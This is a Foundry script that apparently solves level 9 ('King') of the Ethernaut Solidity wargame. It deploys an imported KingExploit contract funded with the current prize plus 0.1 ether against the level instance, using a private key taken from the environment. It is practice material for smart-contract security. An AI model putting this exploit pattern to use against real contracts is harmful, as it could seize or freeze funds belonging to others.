// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {King} from "src/09/King.sol";
import {KingExploit} from "src/09/KingExploit.sol";


contract Exploit is Script {

        King public king;
        KingExploit public exploit;    
        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL9"));  
        uint256 hacker = vm.envUint("PRIVATE_KEY");   
        address deployer = vm.rememberKey(hacker);     
          
        function run() external {
            vm.startBroadcast(deployer);
            king = King(instance);
            exploit = new KingExploit{value: king.prize() + 0.1 ether}(address(king));
            vm.stopBroadcast();
    }
}
